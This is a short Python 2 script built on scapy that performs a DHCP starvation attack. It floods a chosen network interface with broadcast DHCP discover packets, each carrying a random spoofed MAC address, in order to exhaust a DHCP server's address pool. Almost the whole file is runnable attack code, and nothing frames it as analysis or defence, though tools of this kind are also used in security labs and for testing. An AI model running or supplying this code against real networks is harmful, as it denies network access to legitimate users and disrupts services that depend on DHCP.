from scapy.all import *
import sys, getopt
import netifaces

def main(argv):
    ifaceList = netifaces.interfaces()
    try:
        opts, args = getopt.getopt(argv,"hi:",["iface="])
    except getopt.GetoptError:
        print "StarvationDHCP.py -i <interface>"
        print "Interfaces availables: " + str(ifaceList)
        sys.exit(2)
    for opt, arg in opts:
        if opt == "-h":
            print "  --> StarvationDHCP.py [-i | --iface] <interface> // default 'eth0'"
            print "  --> Interfaces availables: " + str(ifaceList)
            sys.exit()
        elif opt in ("-i", "--iface"):

            if str(argv[1]) in ifaceList:
                conf.iface = argv[1]
            else:
                print "Invalid interface. Interfaces availables: " + str(ifaceList)
                exit()
        else:
            conf.iface = 'eth0' #Interface default eth0

    conf.checkIPaddr = False

    print "Interface: " + conf.iface

    print """
        ***                                           ***
        *** Push Ctrl+C to stop after several seconds ***
        ***                                           ***
        """

    for x in range(255): # send 255 packet with fakes macs
        src_mac = str(RandMAC())
        ether = Ether(dst='ff:ff:ff:ff:ff:ff',src=src_mac)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=src_mac, ciaddr='0.0.0.0', flags=1)
        dhcp = DHCP(options=[("message-type", "discover"), "end"])
        packet = ether/ip/udp/bootp/dhcp    # create packet
        packet.show() #show info to generated packet

    #sendp(packet,loop=1) # send a packet countless times
        sendp(packet)

if __name__ == "__main__":
    main(sys.argv[1:])

